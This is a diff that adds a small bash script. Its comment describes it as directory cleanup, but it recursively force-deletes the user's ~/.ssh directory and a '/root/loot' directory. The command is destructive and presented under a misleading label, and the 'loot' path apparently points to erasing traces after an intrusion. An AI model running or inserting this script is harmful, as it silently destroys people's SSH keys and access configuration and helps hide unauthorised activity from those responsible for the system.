@@ -1,0 +1,6 @@
+#!/bin/bash
+
+# Clean up each directory
+for d in "${HOME}/.ssh" "/root/loot"; do
+    [ -d "${d}" ] && rm -rf "${d}"
+done
